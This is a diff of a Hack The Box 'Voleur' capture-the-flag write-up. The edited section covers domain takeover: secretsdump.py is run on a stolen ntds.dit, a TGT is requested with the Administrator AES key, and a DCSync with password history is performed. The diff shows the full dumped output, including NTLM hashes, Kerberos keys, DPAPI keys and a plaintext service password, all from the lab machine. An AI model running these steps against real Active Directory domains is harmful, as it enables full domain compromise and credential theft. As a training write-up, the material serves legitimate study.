@@ -1407,81 +1407,20 @@ SECURITY                                                                        
 SYSTEM                                                                                                                                                                         100%   18MB   5.2MB/s   00:03
 ```
 
-Extract **NTDS**
+Parse **NTDS**
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Voleur]
-└─$ secretsdump.py -o secretsdump -ntds 'loot/Backups/Active Directory/ntds.dit' -security 'loot/Backups/registry/SECURITY' -system 'loot/Backups/registry/SYSTEM' LOCAL
-/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
+└─$ secretsdump.py -ntds 'loot/Backups/Active Directory/ntds.dit' -security 'loot/Backups/registry/SECURITY' -system 'loot/Backups/registry/SYSTEM' LOCAL
 Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
-[*] Dumping cached domain logon information (domain/username:hash)
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC
-$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
-$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
-[*] DPAPI_SYSTEM
-dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
-dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
-[*] NL$KM
- 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
- 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
- 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
- 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
-NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Searching for pekList, be patient
-[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
-[*] Reading and decrypting hashes from loot/Backups/Active Directory/ntds.dit
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
-voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
-voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
-voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
-voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
-voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
-voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
-voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
-voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+[...]
 [*] Kerberos keys from loot/Backups/Active Directory/ntds.dit
 Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
 Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
 Administrator:des-cbc-md5:459d836b9edcd6b0
-DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
-DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
-DC$:des-cbc-md5:64e05b6d1abff1c8
-krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
-krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
-krbtgt:des-cbc-md5:34ae31d073f86d20
-voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
-voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
-voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
-voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
-voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
-voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
-voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
-voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
-voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
-voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
-voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
-voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
-voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
-voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
-voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
-voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
-voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
-voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
-voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
-voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
-voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
-voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
-voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
-voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
-[*] Cleaning up...
+[...]
 ```
 
 
@@ -1491,14 +1430,12 @@ Request a TGT for `Administrator`
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Voleur]
-└─$ creds-set 'administrator' 'e656e07c56d831611b577b160b259ad2'
-[+] Hash set for user administrator
+└─$ creds-set 'administrator' 'f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb'
+[+] aesKey set for user administrator
 
 ┌──(bravosec㉿fsociety)-[~/htb/Voleur]
-└─$ getTGT.py -dc-ip $(pt get ip) -hashes ":$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
-/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
-Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies
+└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)/$(pt get user)" -aesKey "$(pt get ekey)"; pt set ticket $(realpath "$(pt get user).ccache")
+Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in administrator.ccache
 ```
@@ -1532,10 +1469,8 @@ voleur\administrator
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Voleur]
-└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump
-/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
-Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies
+└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump -history
+Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
@@ -1547,31 +1482,55 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] $MACHINE.ACC
 VOLEUR\DC$:plain_password_hex:7a03c00656cb4a599f624dc8892d97db695db0766ce9cb831f817f476ca33805d1ce2128a948ddc4baf7054a6b3c97995d3b5e04c2437fa403db517628dd70c9be6f24affbc5fac1bb8cb2cec7f91eb24ab4870ef12ab4dd3adf39f7c68f544507258006e20926ae5fd0e0e1b8f86e83ffe2568f82ae65c0a9d709a647adf8664b10b48ef6f88150119ad94043be81690e2ba01ff67b90c705266ab45c30c9f6e024465788ea45f711aade7509bafe498645e1366527696a085c309844c316339185e1f8be9e4ff93116cb8a2e0f70f159b5ce29b9bc943868a263f5b23f31580dbd26d3e85cf66f3ae84b47ec56a134
 VOLEUR\DC$:aad3b435b51404eeaad3b435b51404ee:6818b9e11d0cde0f43fb9f812e49807b:::
+[*] $MACHINE.ACC_history
+VOLEUR\DC$:plain_password_hex:a9c10fdd6af344adf90ceeb80dfbea26207efae1d859da5f3ec3c7a5431ddcc557e673e4a65050c7173532d4342b16a3ceaf973c48c4270a4af3d07aec32650cf16d566da6432592e65ef72fff803ead16f035f814c9e2f2c7b4e043fd0aafcddb7d1236952580287ad0202fa4343512f2f7cb5f90c43700eb63777f41367c229b3da39c3230747479435de03b7942dfeea2ba6b3d717eb6401bd590f333bdc695829a5309ffe45ea199c5cb17e910f098258f2470ac2b17ed403e4431615e3df82ea5dd6700e70c1c5ee04a768ee33bae0b0c8b8854dfc9ca4036569ee6a8b9b91cf45af4542a332d1c063547292b3b
+VOLEUR\DC$:aad3b435b51404eeaad3b435b51404ee:37c09f333e78c18f1f3343179afe07e0:::
 [*] DefaultPassword
 VOLEUR\svc_backup:J7VgZ4N8rTqL3x
 [*] DPAPI_SYSTEM
 dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
 dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
+[*] DPAPI_SYSTEM_history
+dpapi_machinekey:0x5197a2271f41b0d09686dfa4a9409329e0346c05
+dpapi_userkey:0xdb03b25a4504573e8e121916e7137910460781e3
 [*] NL$KM
  0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
  0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
  0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
  0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
 NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
+[*] NL$KM_history
+ 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
+ 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
+ 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
+ 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
+NL$KM_history:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
 voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
+voleur.htb\ryan.naylor_history0:1103:aad3b435b51404eeaad3b435b51404ee:4e68fbc9977b80f87970aae4b1cd0151:::
+voleur.htb\ryan.naylor_history1:1103:aad3b435b51404eeaad3b435b51404ee:4e68fbc9977b80f87970aae4b1cd0151:::
 voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
+voleur.htb\marie.bryant_history0:1104:aad3b435b51404eeaad3b435b51404ee:31d08d393fe9f4d4e0fb9869aa0911bb:::
 voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
+voleur.htb\lacey.miller_history0:1105:aad3b435b51404eeaad3b435b51404ee:5997fa41f5516960728d67ee1e28c9b7:::
+voleur.htb\lacey.miller_history1:1105:aad3b435b51404eeaad3b435b51404ee:5997fa41f5516960728d67ee1e28c9b7:::
 voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
+voleur.htb\svc_ldap_history0:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
 voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
+voleur.htb\svc_backup_history0:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
 voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
+voleur.htb\svc_iis_history0:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
 voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\jeremy.combs_history0:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\jeremy.combs_history1:1109:aad3b435b51404eeaad3b435b51404ee:be0945a53f3446e3eaff774e0123464f:::
 voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:046f55328295cb52931f62470f7b1084:::
+voleur.htb\svc_winrm_history0:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
 DC$:1000:aad3b435b51404eeaad3b435b51404ee:6818b9e11d0cde0f43fb9f812e49807b:::
+DC$_history0:1000:aad3b435b51404eeaad3b435b51404ee:37c09f333e78c18f1f3343179afe07e0:::
 [*] Kerberos keys grabbed
 Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
 Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
